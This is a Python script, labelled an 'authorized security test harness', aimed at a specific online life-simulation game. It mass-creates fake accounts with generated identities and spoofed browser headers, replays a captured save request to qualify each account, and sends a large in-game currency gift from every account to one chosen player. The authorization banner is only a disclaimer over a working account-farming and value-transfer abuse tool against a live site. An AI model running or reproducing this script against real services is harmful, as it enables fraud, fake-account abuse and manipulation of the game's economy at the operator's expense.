#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BENFEITECH · Authorized Security Test Harness               ║
║  Only run against systems you own or are explicitly          ║
║  authorized to test.                                         ║
╚══════════════════════════════════════════════════════════════╝
"""

import requests
import random
import time
import json
import os
import re
from faker import Faker
from colorama import init, Fore, Style

init(autoreset=True)

# ══════════════════════════════════════════════════════════════════
#  PALETTE — no red, no blue
# ══════════════════════════════════════════════════════════════════
C_ACCENT = Fore.MAGENTA
C_HEAD   = Fore.LIGHTWHITE_EX
C_OK     = Fore.GREEN
C_WARN   = Fore.YELLOW
C_ERR    = Fore.LIGHTMAGENTA_EX
C_INFO   = Fore.LIGHTYELLOW_EX
C_LABEL  = Fore.LIGHTBLACK_EX
C_VALUE  = Fore.WHITE
C_HIGH   = Fore.LIGHTGREEN_EX
C_SUB    = Fore.LIGHTBLACK_EX
B, D, R  = Style.BRIGHT, Style.DIM, Style.RESET_ALL

# ══════════════════════════════════════════════════════════════════
#  UNICODE
# ══════════════════════════════════════════════════════════════════
U_OK, U_NO, U_WARN = "✔", "✘", "⚠"
U_ARROW, U_DOT     = "→", "•"
U_DIAMOND, U_TRI   = "◆", "▸"
U_TL, U_TR, U_BL, U_BR = "╭", "╮", "╰", "╯"
U_H, U_V           = "─", "│"
U_SEP_L, U_SEP_R   = "├", "┤"
U_BAR              = "▌"

# ══════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════
BASE_URL          = "https://lagoslife.app"
REGISTER_ENDPOINT = f"{BASE_URL}/api/auth/register"
ME_ENDPOINT       = f"{BASE_URL}/api/auth/me"
SAVE_ENDPOINT     = f"{BASE_URL}/api/save"
SEND_ENDPOINT     = f"{BASE_URL}/api/send"
PLAYERS_ENDPOINT  = f"{BASE_URL}/api/players"

DEMO_GIFT_AMOUNT    = 1050000
SAVE_TEMPLATE_FILE  = "save_template.json"
SAVE_CURL_FILE      = "save_request.txt"
SAVE_METHODS_TO_TRY = ["PUT", "POST", "PATCH"]

W = 62
fake = Faker()

_ANSI = re.compile(r"\x1b\[[0-9;]*m")
def _vlen(s): return len(_ANSI.sub("", s))


# ══════════════════════════════════════════════════════════════════
#  PRIMITIVES
# ══════════════════════════════════════════════════════════════════
def _emit(inner):
    pad = " " * max(0, W - _vlen(inner))
    print(f"  {C_ACCENT}{U_V}{R}{inner}{pad}{C_ACCENT}{U_V}{R}")

def box_open(title="", subtitle=""):
    if title:
        head = f"{U_H} {title} "
        fill = U_H * max(0, W - len(head) - 1)
        print(f"  {C_ACCENT}{U_TL}{head}{fill}{U_TR}{R}")
    else:
        print(f"  {C_ACCENT}{U_TL}{U_H * (W + 1)}{U_TR}{R}")
    if subtitle:
        _emit(f"  {C_SUB}{subtitle}{R}")

def box_close():
    print(f"  {C_ACCENT}{U_BL}{U_H * (W + 1)}{U_BR}{R}")

def box_sep():
    print(f"  {C_ACCENT}{U_SEP_L}{U_H * (W + 1)}{U_SEP_R}{R}")

def wrap_text(text, width):
    """Wrap long text into lines that fit the box."""
    words = str(text).split()
    lines, cur = [], ""
    for w_ in words:
        if not cur:
            cur = w_
        elif len(cur) + 1 + len(w_) <= width:
            cur += " " + w_
        else:
            lines.append(cur)
            cur = w_
    if cur:
        lines.append(cur)
    return lines or [""]

def kv(label, value, label_col=C_LABEL, value_col=C_VALUE):
    _emit(f"  {label_col}{label:<16}{R}  {value_col}{value}{R}")

def kv_ok(label, value=""):
    _emit(f"  {C_LABEL}{label:<16}{R}  {C_OK}{U_OK}{R} {C_VALUE}{value}{R}")

def kv_no(label, value=""):
    _emit(f"  {C_LABEL}{label:<16}{R}  {C_ERR}{U_NO}{R} {C_VALUE}{value}{R}")

def kv_warn(label, value=""):
    _emit(f"  {C_LABEL}{label:<16}{R}  {C_WARN}{U_WARN}{R} {C_VALUE}{value}{R}")

def wrap_line(text, col=C_VALUE):
    """Multi-line value that respects the box borders."""
    for ln in wrap_text(text, W - 4):
        _emit(f"  {col}{ln}{R}")

def out_ok(m):   print(f"  {C_OK}{U_OK}{R}  {m}")
def out_no(m):   print(f"  {C_ERR}{U_NO}{R}  {m}")
def out_warn(m): print(f"  {C_WARN}{U_WARN}{R}  {m}")
def out_info(m): print(f"  {C_INFO}{U_ARROW}{R}  {m}")


# ══════════════════════════════════════════════════════════════════
#  HEADERS
# ══════════════════════════════════════════════════════════════════
def browser_headers():
    return {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": BASE_URL,
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": f"{BASE_URL}/",
        "sec-ch-ua": '"Google Chrome";v="153", "Not_A Brand";v="8", '
                     '"Chromium";v="153"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/153.0.0.0 Safari/537.36"),
    }


# ══════════════════════════════════════════════════════════════════
#  cURL / PAYLOAD
# ══════════════════════════════════════════════════════════════════
def parse_curl(text):
    text = text.replace("\\\n", " ")
    method = "POST"
    m = re.search(r"-X\s+([A-Z]+)", text)
    if m:
        method = m.group(1).upper()
    elif "--data" in text or re.search(r"\s-d\s", text):
        method = "POST"

    body = None
    for pat in (r"--data-raw\s+'([^']*)'", r'--data-raw\s+"([^"]*)"',
                r"--data\s+'([^']*)'", r"-d\s+'([^']*)'"):
        m = re.search(pat, text)
        if m:
            body = m.group(1)
            break

    headers = {}
    for hm in re.finditer(r"-H\s+'([^:]+):\s*([^']*)'", text):
        headers[hm.group(1).strip()] = hm.group(2).strip()
    return method, headers, body


def load_save_request():
    if os.path.exists(SAVE_CURL_FILE):
        with open(SAVE_CURL_FILE, "r", encoding="utf-8") as f:
            method, headers, body = parse_curl(f.read())
        body_dict = None
        if body:
            try:
                body_dict = json.loads(body)
            except Exception as e:
                out_warn(f"couldn't parse captured body: {e}")
        out_info(f"loaded /api/save from cURL "
                 f"{C_SUB}(method={method}){R}")
        return method, headers, body_dict, "curl"

    if os.path.exists(SAVE_TEMPLATE_FILE):
        with open(SAVE_TEMPLATE_FILE, "r", encoding="utf-8") as f:
            body_dict = json.load(f)
        out_info(f"loaded /api/save from "
                 f"{C_HEAD}{SAVE_TEMPLATE_FILE}{R}")
        return None, {}, body_dict, "template"

    return None, {}, None, "fallback"


def personalize(body, user_id, username):
    if not body:
        return None
    body = json.loads(json.dumps(body))
    def walk(n):
        if isinstance(n, dict):
            for k, v in list(n.items()):
                if k == "owner" and isinstance(v, str):
                    n[k] = user_id
                elif k == "name" and isinstance(v, str) and len(v) < 40:
                    n[k] = username
                else:
                    walk(v)
        elif isinstance(n, list):
            for i in n: walk(i)
    walk(body)
    return body


def default_onboarding(user_id, username):
    return {
        "fresh": True, "owner": user_id, "replace": 0,
        "game": {
            "version": 1, "phase": "play", "owner": user_id,
            "home": "abjGwarinpa", "origin": "lapo", "location": "home",
            "money": 1090000, "sim": {"name": username},
            "skills": {"cooking": 1, "charisma": 1, "fitness": 1,
                       "coding": 1, "music": 1, "hustle": 2,
                       "dance": 1, "comedy": 1},
            "needs": {"hunger": 80, "energy": 85, "hygiene": 75,
                      "bladder": 70, "fun": 70, "social": 60},
            "stats": {"earnedToday": 0, "earnedTotal": 0, "socials": 0,
                      "dayStarted": 1014, "actionsDone": {}, "visited": []},
            "tutorialStep": 0, "tour": "done", "wishes": [],
            "objects": [{"uid": "o1", "type": "vono", "x": 0, "y": 0}],
            "pantry": {"rice": 2, "gino": 2, "maggi": 6, "oil": 4},
            "weather": "sunny", "time": 1461280.5,
            "music": True, "sound": True, "speed": 1,
        },
    }


# ══════════════════════════════════════════════════════════════════
#  HTTP CALLS
# ══════════════════════════════════════════════════════════════════
def register(session, data):
    try:
        r = session.post(REGISTER_ENDPOINT, json=data, timeout=15)
    except Exception as e:
        return None, str(e)
    if r.status_code in (200, 201):
        try:
            return r.json(), None
        except Exception:
            return None, "invalid JSON"
    return None, f"HTTP {r.status_code}"


def fetch_me(session):
    for m in ("POST", "GET"):
        try:
            r = session.request(m, ME_ENDPOINT, json={}, timeout=15)
        except Exception:
            continue
        if r.status_code == 200:
            try:
                return r.json()
            except Exception:
                return None
    return None


def search_players(session, query):
    try:
        r = session.get(PLAYERS_ENDPOINT, params={"q": query}, timeout=15)
    except Exception as e:
        return None, str(e)
    if r.status_code == 200:
        try:
            return r.json().get("players", []), None
        except Exception:
            return None, "invalid JSON"
    return None, f"HTTP {r.status_code}"


def do_save(session, user_id, username,
            cap_method, cap_headers, cap_body, source):
    if cap_body:
        payload = personalize(cap_body, user_id, username)
        methods = [cap_method] if cap_method else SAVE_METHODS_TO_TRY
    else:
        payload = default_onboarding(user_id, username)
        methods = SAVE_METHODS_TO_TRY

    extra = {k: v for k, v in (cap_headers or {}).items()
             if k.lower() not in ("content-length", "cookie",
                                  "host", "accept-encoding")}

    last = None
    for m in methods:
        try:
            r = session.request(m, SAVE_ENDPOINT, json=payload,
                                headers=extra, timeout=15)
        except Exception as e:
            last = (m, "err", str(e)[:120])
            continue
        if r.status_code in (200, 201, 204):
            try:
                return (r.json() if r.text else {"ok": True}), m, source
            except Exception:
                return {"ok": True}, m, source
        last = (m, r.status_code, r.text[:300])
    return None, last, source


def send_gift(session, target_id):
    """Return (parsed_or_None, error_text_or_None, full_body_or_None)."""
    try:
        r = session.post(SEND_ENDPOINT,
                         json={"to": target_id, "amount": DEMO_GIFT_AMOUNT},
                         timeout=15)
    except Exception as e:
        return None, str(e), None

    body_text = r.text or ""
    if r.status_code in (200, 201):
        try:
            return r.json(), None, body_text
        except Exception:
            return {"raw": body_text[:200]}, None, body_text

    # Extract a server-provided message if present
    msg = None
    try:
        j = r.json()
        msg = j.get("error") or j.get("message") or j.get("detail")
    except Exception:
        pass
    err = f"HTTP {r.status_code}" + (f" — {msg}" if msg else "")
    return None, err, body_text


def gen_account():
    return {
        "username": fake.user_name() + str(random.randint(100, 9999)),
        "password": fake.password(length=14, special_chars=True,
                                  digits=True, upper_case=True,
                                  lower_case=True),
        "name": fake.name(),
        "adult": True,
        "born": fake.date_of_birth(minimum_age=18, maximum_age=45).isoformat(),
    }


# ══════════════════════════════════════════════════════════════════
#  PLAYER DISPLAY / PICKER
# ══════════════════════════════════════════════════════════════════
def render_players(players, query):
    box_open("Matching Players",
             f"query: {C_HEAD}{query}{R}   "
             f"{C_SUB}·{R}   {C_SUB}{len(players)} result(s){R}")
    box_sep()
    for i, p in enumerate(players, 1):
        uname = p.get("username", "?")
        name  = p.get("name", "")
        loc   = p.get("location", "")
        online = p.get("online", False)
        dot = f"{C_OK}{U_DOT}{R}" if online else f"{C_SUB}{U_DOT}{R}"
        idx = f"{C_ACCENT}{i:>2}{R}"
        head = f"{C_HEAD}@{uname}{R}"
        meta = (f"{C_LABEL}{name}{R}  {C_SUB}·{R}  "
                f"{C_SUB}{loc}{R}  {dot}")
        pad = max(1, W - 4 - _vlen(idx) - 1 - len(uname) - 1 - _vlen(meta))
        _emit(f"  {idx}  {head}{' ' * pad}{meta}")
    box_close()


def pick_target(players, query):
    for p in players:
        if p.get("username", "").lower() == query.lower():
            return p, True
    if not players:
        return None, False

    render_players(players, query)
    while True:
        raw = input(f"  {C_ACCENT}{U_TRI}{R} {C_INFO}select # "
                    f"(q to abort){R}  ").strip()
        if raw.lower() in ("", "q", "quit"):
            return None, False
        try:
            i = int(raw)
            if 1 <= i <= len(players):
                return players[i - 1], False
        except ValueError:
            pass
        out_warn("invalid selection")


# ══════════════════════════════════════════════════════════════════
#  BANNER + PREFLIGHT
# ══════════════════════════════════════════════════════════════════
def banner():
    print()
    print(f"  {C_ACCENT}{'═' * (W + 3)}{R}")
    print(f"  {C_ACCENT}{U_BAR}{R}  {C_HEAD}{B}BENFEITECH{R}  "
          f"{C_SUB}·{R}  {C_INFO}Authorized Security Test Harness{R}")
    print(f"  {C_ACCENT}{'═' * (W + 3)}{R}")
    print(f"  {C_WARN}{U_WARN}{R} {D}For testing your own application only.{R}")
    print()


def preflight(source):
    """Loud, unmistakable warning if we're about to run unqualified."""
    if source == "fallback":
        box_open("⚠  NO CAPTURED /api/save PAYLOAD FOUND",
                 "the fallback payload typically returns 200 on /save")
        box_sep()
        wrap_line("Your server accepts the fallback but does NOT "
                  "actually qualify the account — so /api/send will "
                  "return 400.", C_WARN)
        box_sep()
        kv("fix", "capture a real /api/save request", value_col=C_HEAD)
        kv("where", "DevTools → Network → filter: save")
        kv("how", "right-click → Copy as cURL")
        kv("save as", "save_request.txt", value_col=C_HIGH)
        box_close()
        print()


def ask(prompt, default=None):
    suffix = f"  {C_SUB}({default}){R}" if default else ""
    return (input(f"  {C_ACCENT}{U_TRI}{R} {C_INFO}{prompt}{R}{suffix}  ")
            .strip()) or (default or "")


# ══════════════════════════════════════════════════════════════════
#  ACCOUNT REPORT
# ══════════════════════════════════════════════════════════════════
def render_account(idx, total, data, user_id, me_before, me_after,
                   save_ok, save_method, save_err,
                   gift, gift_err):
    box_open(f"Account {idx} of {total}",
             f"{C_SUB}register → me → save → me → send{R}")
    box_sep()
    kv("username", data["username"], value_col=C_HEAD)
    kv("password", data["password"])
    kv("name",     data["name"])
    kv("born",     data["born"])
    kv("user id",  user_id or "—",
       value_col=C_OK if user_id else C_ERR)

    if me_after and me_after.get("user"):
        u = me_after["user"]
        # show any qualification-looking flags we can find
        for flag in ("qualified", "verified", "giftPark", "gift_park",
                     "tour", "onboarded", "active"):
            if flag in u:
                kv(f"user.{flag}", str(u[flag]))
    box_sep()

    kv_ok("register", "ok" if user_id else "")
    kv_ok("me (before)", "session valid") if me_before else \
        kv_warn("me (before)", "no response")

    if save_ok:
        kv_ok("save", f"200 {C_SUB}({save_method}){R}")
    else:
        kv_no("save", save_err or "")

    if me_after is not None:
        kv_ok("me (after)", "refreshed")
    elif save_ok:
        kv_warn("me (after)", "no response")

    if gift:
        kv_ok("send", "gift delivered")
        box_sep()
        kv("gift id", gift.get("id", "—"), value_col=C_HIGH)
        kv("amount", f"{gift.get('amount', DEMO_GIFT_AMOUNT):,}",
           value_col=C_OK)
        kv("fee", f"{gift.get('fee', '—')}", value_col=C_LABEL)
    else:
        kv_no("send", gift_err or "")
    box_close()


def render_summary(results, target, source):
    box_open("Summary",
             f"target  {C_HEAD}@{target.get('username','?')}{R}  "
             f"{C_SUB}({target.get('id','?')}){R}")
    box_sep()
    total   = len(results)
    reg_n   = sum(1 for r in results if r.get("user_id"))
    saved_n = sum(1 for r in results if r.get("save_response"))
    sent_n  = sum(1 for r in results if r.get("gift_response"))

    kv("save source", source,
       value_col=C_OK if source in ("curl", "template") else C_WARN)
    kv("accounts created", f"{reg_n} / {total}",
       value_col=C_OK if reg_n == total else C_WARN)
    kv("accounts qualified", f"{saved_n} / {total}",
       value_col=C_OK if saved_n == total else C_WARN)
    kv("gifts sent", f"{sent_n} / {total}",
       value_col=C_OK if sent_n else C_ERR)

    amt = sum((r["gift_response"].get("amount", 0)
               if isinstance(r.get("gift_response"), dict) else 0)
              for r in results)
    if amt:
        box_sep()
        kv("demo value moved", f"{amt:,}", value_col=C_HIGH)

    # If send failed for every attempt, show the last error body once
    if sent_n == 0:
        last_err = next((r.get("gift_error_body") for r in reversed(results)
                         if r.get("gift_error_body")), None)
        if last_err:
            box_sep()
            wrap_line("last /send error body:", C_ERR)
            for ln in wrap_text(last_err, W - 4):
                _emit(f"  {C_ERR}{ln}{R}")
    box_close()


# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════
def main():
    banner()
    cap_method, cap_headers, cap_body, source = load_save_request()
    preflight(source)

    print()
    target_query = ask("target username to gift")
    if not target_query:
        out_no("no username provided")
        return

    try:
        count = int(ask("number of accounts to create", default="1"))
        if count <= 0:
            raise ValueError
    except ValueError:
        out_no("invalid account count")
        return

    results = []
    target = None

    for i in range(1, count + 1):
        print()
        data = gen_account()

        print(f"  {C_ACCENT}{U_DIAMOND}{R} "
              f"{C_HEAD}Account {i} of {count}{R}  "
              f"{C_SUB}·  registering{R}")

        session = requests.Session()
        session.headers.update(browser_headers())

        reg, reg_err = register(session, data)
        if not reg:
            out_no(f"register failed — {reg_err}")
            results.append({
                "username": data["username"],
                "password": data["password"],
                "user_id": None, "cookies": {},
                "save_response": None, "gift_response": None,
                "gift_error_body": None,
                "note": "register failed",
            })
            time.sleep(1)
            continue

        user_id = reg.get("user", {}).get("id") or reg.get("id")
        out_ok(f"registered  {C_SUB}id={user_id}{R}")

        # ---- first account → find target ----
        if target is None:
            out_info(f"searching players for "
                     f"{C_HEAD}{target_query}{R} ...")
            players, serr = search_players(session, target_query)
            if players is None:
                out_no(f"search failed — {serr}")
                return
            if not players:
                out_warn("no players matched — aborting")
                return
            chosen, exact = pick_target(players, target_query)
            if not chosen:
                out_no("no target selected — aborting")
                return
            target = chosen
            tag = "exact match" if exact else "selected"
            out_ok(f"{tag}: {C_HEAD}@{target['username']}{R}  "
                   f"{C_SUB}({target['id']}){R}")

        me_before = fetch_me(session)

        save_ok, save_meta, src = do_save(
            session, user_id, data["username"],
            cap_method, cap_headers, cap_body, source
        )
        save_method, save_err = "", None
        if not save_ok:
            if isinstance(save_meta, tuple):
                save_method = save_meta[0]
                save_err = f"{save_meta[1]}"
            else:
                save_err = str(save_meta)
        else:
            save_method = save_meta

        # ---- re-check user state AFTER save (diagnostic) ----
        me_after = fetch_me(session) if save_ok else None

        gift, gift_err, gift_body = None, None, None
        if save_ok:
            time.sleep(1.2)
            gift, gift_err, gift_body = send_gift(session, target["id"])
        else:
            gift_err = "skipped — not qualified"

        render_account(i, count, data, user_id,
                       me_before, me_after,
                       save_ok, save_method, save_err,
                       gift, gift_err)

        results.append({
            "username": data["username"],
            "password": data["password"],
            "user_id": user_id,
            "cookies": session.cookies.get_dict(),
            "me_before": me_before,
            "me_after": me_after,
            "save_response": save_ok,
            "save_method": save_method,
            "save_source": source,
            "gift_response": gift,
            "gift_error": gift_err,
            "gift_error_body": gift_body,
        })

        time.sleep(1)

    print()
    render_summary(results, target or {"username": "—", "id": "—"}, source)

    out_file = "automation_test_results.json"
    with open(out_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print()
    out_info(f"full results saved to {C_HEAD}{out_file}{R}")
    print()


if __name__ == "__main__":
    main()
